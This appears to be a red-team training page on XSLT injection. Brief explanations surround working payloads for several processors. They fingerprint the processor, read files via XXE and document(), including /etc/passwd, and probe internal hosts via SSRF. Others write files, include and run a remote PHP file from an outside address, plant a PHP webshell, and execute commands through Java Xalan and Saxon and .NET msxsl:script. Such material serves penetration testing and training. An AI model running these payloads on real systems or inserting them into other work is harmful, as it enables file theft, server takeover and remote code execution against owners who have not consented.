---
layout: training-page
title: "XSLT Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - xslt-injection
  - xxe
  - rce
  - file-read
  - ssrf
  - java
  - php
  - dotnet
page_key: "web-xslt-injection"
render_with_liquid: false
---

# XSLT Injection

XSLT (Extensible Stylesheet Language Transformations) Injection occurs when an application processes an attacker-controlled XSL stylesheet without validation. XSLT is a powerful XML transformation language that can include external files, make HTTP requests, and — on some platforms — execute arbitrary code. Processing an unvalidated XSLT stylesheet can allow an attacker to read files, perform SSRF, write files, or achieve full remote code execution.

## Fingerprinting the XSLT Processor

Determine the vendor and version to select the right exploitation technique:

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:value-of select="system-property('xsl:vendor')"/>
  </xsl:template>
</xsl:stylesheet>
```

Extended fingerprinting for PHP environments:

```
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
  Version: <xsl:value-of select="system-property('xsl:version')" />
  Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
  Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
</body>
</html>
```

## External Entity (XXE)

Always test for XXE when encountering XSLT files. Declare a DOCTYPE with an external entity and reference it in the template:

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "C:\secretfruit.txt">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    Fruits &ext_file;:
    <xsl:for-each select="fruit">
      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

## Read Files and SSRF via document()

The `document()` function loads external XML documents. It can be pointed at local files or internal network addresses to perform file reads and SSRF:

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <xsl:copy-of select="document('http://172.16.132.1:25')"/>
    <xsl:copy-of select="document('/etc/passwd')"/>
    <xsl:copy-of select="document('file:///c:/winnt/win.ini')"/>
  </xsl:template>
</xsl:stylesheet>
```

## Write Files via EXSLT Extension

EXSLT extensions add functionality not available in standard XSLT. The `exploit:document` element from the EXSLT common extension can write arbitrary files:

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit"
  version="1.0">
  <xsl:template match="/">
    <exploit:document href="evil.txt" method="text">
      Hello World!
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

## Remote Code Execution — PHP

The PHP XSL extension exposes a `php:` namespace that allows calling PHP functions directly from XSLT.

### Read a file with readfile()

```
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
  <xsl:value-of select="php:function('readfile','index.php')" />
</body>
</html>
```

### List directory with scandir()

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
  </xsl:template>
</xsl:stylesheet>
```

### Execute remote PHP file with assert()

```
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body>
  <xsl:variable name="payload">
    include("http://10.10.10.10/test.php")
  </xsl:variable>
  <xsl:variable name="include" select="php:function('assert',$payload)"/>
</body>
</html>
```

### Write a webshell with file_put_contents()

```
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of select="php:function('file_put_contents','/var/www/webshell.php','<?php echo system($_GET["command"]); ?>')" />
  </xsl:template>
</xsl:stylesheet>
```

## Remote Code Execution — Java (Xalan)

Apache Xalan exposes Java runtime classes via XML namespace declarations. This allows calling `java.lang.Runtime.exec()` to execute system commands:

```
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
    <xsl:variable name="processString" select="ob:toString($process)"/>
    <xsl:value-of select="$processString"/>
  </xsl:template>
</xsl:stylesheet>
```

### Saxon XSLT 2.0

```
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:java="http://saxon.sf.net/java-type">
<xsl:template match="/">
  <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping 10.10.10.1')" xmlns:Runtime="java:java.lang.Runtime"/>
</xsl:template>
</xsl:stylesheet>
```

## Remote Code Execution — .NET (msxsl:script)

Microsoft's MSXML processor supports inline C# code blocks via `msxsl:script`. This executes arbitrary .NET code during the transformation:

```
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:msxsl="urn:schemas-microsoft-com:xslt"
  xmlns:user="urn:my-scripts">

<msxsl:script language="C#" implements-prefix="user">
<![CDATA[
public string execute(){
  System.Diagnostics.Process proc = new System.Diagnostics.Process();
  proc.StartInfo.FileName = "C:\\windows\\system32\\cmd.exe";
  proc.StartInfo.RedirectStandardOutput = true;
  proc.StartInfo.UseShellExecute = false;
  proc.StartInfo.Arguments = "/c dir";
  proc.Start();
  proc.WaitForExit();
  return proc.StandardOutput.ReadToEnd();
}
]]>
</msxsl:script>

  <xsl:template match="/fruits">
    <xsl:value-of select="user:execute()"/>
  </xsl:template>
</xsl:stylesheet>
```

## Resources

- Root Me — XSLT Code execution — `root-me.org/en/Challenges/Web-Server/XSLT-Code-execution`
- From XSLT code execution to Meterpreter shells — Nicolas Grégoire (@agarri)
- XSLT Injection — Fortify
- XSLT Injection Basics — Saxon — Hunnic Cyber Team
